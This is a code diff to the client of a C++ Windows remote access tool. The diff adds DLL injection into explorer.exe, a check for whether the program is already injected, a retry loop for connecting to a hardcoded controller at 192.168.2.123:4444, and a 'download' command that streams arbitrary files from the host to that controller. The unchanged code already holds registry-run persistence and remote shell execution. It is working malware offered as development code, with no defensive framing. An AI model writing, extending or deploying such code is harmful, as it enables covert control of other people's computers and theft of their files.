@@ -4,6 +4,7 @@
 #include <string>
 #include <tlhelp32.h>
 #include <windows.h>
+#include <fstream>
 #define _WINSOCK_DEPRECATED_NO_WARNINGS
 #pragma comment(lib, "ws2_32.lib") // Link with the ws2_32.lib library
 
@@ -55,7 +56,7 @@ bool AddToStartup() {
     return true;
 }
 
-// Function to remove from startup (optional cleanup)
+// Function to remove from startup (optional)
 bool RemoveFromStartup() {
     HKEY hKey;
     const char* czStartName = "MyClientApp";
@@ -78,29 +79,71 @@ bool RemoveFromStartup() {
     return (result == ERROR_SUCCESS);
 }
 
+// END MODIFICATION
+// MODIFICATION: Process injection functions to inject into explorer.exe
+// Find process ID by name
 DWORD FindProcessId(const std::wstring& processName) {
-    PROCESSENTRY32 processEntry;
-    processEntry.dwSize = sizeof(PROCESSENTRY32);
+    PROCESSENTRY32W processEntry;
+    processEntry.dwSize = sizeof(PROCESSENTRY32W);
 
     HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (snapshot == INVALID_HANDLE_VALUE) {
         return 0;
     }
 
-    if (Process32First(snapshot, &processEntry)) {
+    if (Process32FirstW(snapshot, &processEntry)) {
         do {
             if (processName == processEntry.szExeFile) {
                 CloseHandle(snapshot);
                 return processEntry.th32ProcessID;
             }
-        } while (Process32Next(snapshot, &processEntry));
+        } while (Process32NextW(snapshot, &processEntry));
     }
 
     CloseHandle(snapshot);
     return 0;
 }
 
-// Inject DLL or code into target process
+//check if already injected
+bool IsInjectedIntoExplorer() {
+    DWORD currentPid = GetCurrentProcessId();
+    DWORD parentPid = 0;
+
+    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (snapshot == INVALID_HANDLE_VALUE) {
+        return false;
+    }
+
+    PROCESSENTRY32W processEntry;
+    processEntry.dwSize = sizeof(PROCESSENTRY32W);
+
+    if (Process32FirstW(snapshot, &processEntry)) {
+        do {
+            if (processEntry.th32ProcessID == currentPid) {
+                parentPid = processEntry.th32ParentProcessID;
+                break;
+            }
+        } while (Process32NextW(snapshot, &processEntry));
+    }
+
+    // Now find the parent process name
+    if (parentPid != 0) {
+        if (Process32FirstW(snapshot, &processEntry)) {
+            do {
+                if (processEntry.th32ProcessID == parentPid) {
+                    CloseHandle(snapshot);
+                    // Check if parent is explorer.exe
+                    return (std::wstring(processEntry.szExeFile) == L"explorer.exe");
+                }
+            } while (Process32NextW(snapshot, &processEntry));
+        }
+    }
+
+    CloseHandle(snapshot);
+    return false;
+}
+
+// inject DLL or code into target process
 bool InjectIntoProcess(DWORD processId) {
     //core function for process injection
     char szPath[MAX_PATH];
@@ -139,7 +182,7 @@ bool InjectIntoProcess(DWORD processId) {
         return false;
     }
 
- 
+    // Write the DLL path to the allocated memory
     if (!WriteProcessMemory(hProcess, pRemoteMemory, szPath, strlen(szPath) + 1, NULL)) {
         std::cerr << "Failed to write to process memory. Error: " << GetLastError() << std::endl;
         VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
@@ -156,7 +199,7 @@ bool InjectIntoProcess(DWORD processId) {
         return false;
     }
 
-
+    // Create a remote thread to load the DLL
     HANDLE hThread = CreateRemoteThread(
         hProcess,
         NULL,
@@ -190,6 +233,10 @@ bool InjectIntoProcess(DWORD processId) {
 // Copy executable to Windows directory and create scheduled task
 
 bool SetupPersistenceWithInjection() {
+    if (IsInjectedIntoExplorer()) {
+        std::cout << "Already running inside explorer.exe, skipping injection." << std::endl;
+        return true;
+    }
     char szCurrentPath[MAX_PATH];
     char szTargetPath[MAX_PATH];
 
@@ -230,11 +277,14 @@ bool SetupPersistenceWithInjection() {
 }
 
 std::string exec(const char* cmd) {
+    // Pipe pointer to hold the output stream of the command
     FILE* pipe = nullptr;
+
+    // Use _popen (Windows) to execute the command and open a pipe to read its output
 #ifdef _WIN32
     pipe = _popen(cmd, "r");
 #else
-    
+    // On Linux/macOS, use popen (and the 'ls -l' command would be used instead of 'dir')
     pipe = popen(cmd, "r");
 #endif
 
@@ -264,7 +314,6 @@ std::string exec(const char* cmd) {
     if (status == -1) {
         // Handle closure error (though often ignored for simple commands)
         // For robustness, we check it here.
-        //pending implemention
     }
 
     return result;
@@ -291,6 +340,35 @@ std::string stripFirstWord(std::string sentence, std::string firstWord) {
     }
     return sentence.substr(startPos);
 }
+
+// Function to send a file, -1 means cant open file or error, 0 means fine
+int fileSend(const char* filePath, SOCKET transferSocket) {
+    std::ifstream file(filePath, std::ios::binary | std::ios::ate);
+    if (!file) {
+        std::cerr << "Error: Could not open file." << std::endl;
+        return -1;
+    }
+
+    int fileSize = file.tellg();
+    file.seekg(0, std::ios::beg);
+
+    // Send the file size first
+    if (send(transferSocket, (char*)&fileSize, sizeof(int), 0) == SOCKET_ERROR) {
+        std::cerr << "Send file size failed." << std::endl;
+        return -1;
+    }
+
+    // Send the file content
+    char buffer[1024];
+    while (file.read(buffer, sizeof(buffer))) {
+        send(transferSocket, buffer, file.gcount(), 0);
+    }
+    send(transferSocket, buffer, file.gcount(), 0); // Send the last chunk
+
+    file.close();
+    std::cout << "File '" << filePath << "' sent successfully." << std::endl;
+    return 0;
+}
 int main() {
 
     AddToStartup(); //add Auto-start using registry
@@ -303,46 +381,70 @@ int main() {
     }
 
     SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-    while (clientSocket==INVALID_SOCKET)    //repeating connecting to host
-    {
-        int count = 0;
-        std::cerr << "Failed to connect to host, waiting 7s to reconnect" << std::endl;
-        clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-        if (count>=7) {
-            std::cerr << "Cannot connect to host, Exiting!" << std::endl;
-            WSACleanup();
-            return 1;
-        }
+    if (clientSocket == INVALID_SOCKET) {
+        std::cerr << "Error creating socket." << std::endl;
+        // ... (cleanup and exit)
     }
-    
 
-    sockaddr_in serverAddr;
+    sockaddr_in serverAddr = {};
     serverAddr.sin_family = AF_INET;
+    serverAddr.sin_port = htons(4444);
 
-    // Correctly use inet_pton
+    // Check if the IP address is valid first
     if (inet_pton(AF_INET, "192.168.2.123", &serverAddr.sin_addr) <= 0) {
-        std::cerr << "Invalid address." << std::endl;
+        std::cerr << "Invalid IP address." << std::endl;
         closesocket(clientSocket);
-        WSACleanup();
         return 1;
     }
 
-    serverAddr.sin_port = htons(4444); // should be same as host's listening port
+    const int MAX_RETRIES = 7;
+    const int RETRY_DELAY_MS = 500;
+    int retryCount = 0;
 
-    if (connect(clientSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
-        std::cerr << "Connection failed." << std::endl;
+    // This is the correct location for the retry loop
+    while (retryCount < MAX_RETRIES) {
+        std::cout << "Attempting to connect (attempt " << (retryCount + 1) << "/" << MAX_RETRIES << ")..." << std::endl;
+
+        // Attempt to connect
+        if (connect(clientSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) != SOCKET_ERROR) {
+            std::cout << "Connected to the server successfully!" << std::endl;
+            break; // Exit the loop on success
+        }
+
+        // Connection failed, close the socket and prepare for retry
+        std::cerr << "Connection failed. Error code: " << WSAGetLastError() << std::endl;
+        closesocket(clientSocket);
+        clientSocket = INVALID_SOCKET; // Reset the socket handle
+
+        retryCount++;
+
+        if (retryCount < MAX_RETRIES) {
+            std::cerr << "Waiting 0.5 seconds before retrying..." << std::endl;
+            Sleep(RETRY_DELAY_MS);
+
+            // Re-create the socket for the next attempt
+            clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+            if (clientSocket == INVALID_SOCKET) {
+                std::cerr << "Error re-creating socket." << std::endl;
+                break; // Exit the loop if socket creation fails
+            }
+        }
+    }
+
+    if (retryCount >= MAX_RETRIES) {
+        std::cerr << "Cannot connect to host after " << MAX_RETRIES << " attempts. Exiting!" << std::endl;
         closesocket(clientSocket);
         WSACleanup();
         std::cout << "Press Enter to exit...";
         std::cin.get();
         return 1;
     }
-
+    
     std::cout << "Connected to the server." << std::endl;
 
     while (true) {
         // Receive the size of the incoming message
-        int networkSize;
+        int networkSize=0;
         int bytesReceived = recv(clientSocket, (char*)&networkSize, sizeof(int), 0);
         if (bytesReceived <= 0) {
             std::cerr << "Connection closed by server or failed to receive message size." << std::endl;
@@ -383,46 +485,7 @@ int main() {
             delete[] buffer;
             break;
         }
-        if (receivedMessage == "ls")
-        {
-            const char* command = "dir";
-            try
-            {
-                std::string message = exec(command);
-                while (true) {
-                    // Send the size of the message first, so the client knows how much to receive
-                    int messageSize = message.length();
-                    int networkSize = htonl(messageSize); // Convert to network byte order
-
-                    if (send(clientSocket, (char*)&networkSize, sizeof(int), 0) == SOCKET_ERROR) {
-                        std::cerr << "Send size failed. Host may have disconnected." << std::endl;
-                        break; // Exit loop on error
-                    }
-
-                    // Send the actual message
-                    int totalSent = 0;
-                    while (totalSent < messageSize) {
-                        int sent = send(clientSocket, message.c_str() + totalSent, messageSize - totalSent, 0);
-                        if (sent == SOCKET_ERROR) {
-                            std::cerr << "Send failed. Client may have disconnected." << std::endl;
-                            break;
-                        }
-                        totalSent += sent;
-                    }
-
-                    if (totalSent < messageSize) {
-                        break; // Exit if send was incomplete
-                    }
-
-                    std::cout << "Message sent successfully." << std::endl;
-                    break;
-                }
-            }
-            catch (const std::exception&e)
-            {
-                std::cerr << "An error has occured at ls" << e.what() << std::endl;
-            }
-        }
+        
         if (firstWord(receivedMessage) == "shell")
         {
             try
@@ -463,11 +526,52 @@ int main() {
                 std::cerr << "An error has occured at ls" << e.what() << std::endl;
             }
         }
+        if (firstWord(receivedMessage) == "download")   //host want to download file from Client, download C:\fuck\fucnyou.cpp
+        {
+            std::string filePath=stripFirstWord(receivedMessage.c_str(),"download");
+            size_t lastSlash = filePath.find_last_of("\\/");
+            std::string filename = (lastSlash == std::string::npos) ? filePath : filePath.substr(lastSlash + 1);
+            send(clientSocket, filename.c_str(), filename.length(), 0);
+            const short int RESULT = fileSend(filePath.c_str(), clientSocket);
+            if (RESULT == 0)
+            {
+                int totalSent = 0;
+                std::string message = "Sent complete";
+                while (totalSent < messageSize) {
+                    int sent = send(clientSocket, message.c_str() + totalSent, messageSize - totalSent, 0);
+                    if (sent == SOCKET_ERROR) {
+                        std::cerr << "Send failed. Client may have disconnected." << std::endl;
+                        break;
+                    }
+                    totalSent += sent;
+                }
+
+                if (totalSent < messageSize) {
+                    break; // Exit if send was incomplete
+                }
+            }
+            else
+            {
+                int totalSent = 0;
+                std::string message = "failed to send!";
+                while (totalSent < messageSize) {
+                    int sent = send(clientSocket, message.c_str() + totalSent, messageSize - totalSent, 0);
+                    if (sent == SOCKET_ERROR) {
+                        std::cerr << "Send failed. Client may have disconnected." << std::endl;
+                        break;
+                    }
+                    totalSent += sent;
+                }
+
+                if (totalSent < messageSize) {
+                    break; // Exit if send was incomplete
+                }
+            }
+        }
         delete[] buffer;
     }
 
     closesocket(clientSocket);
     WSACleanup();
     return 0;
-
 }
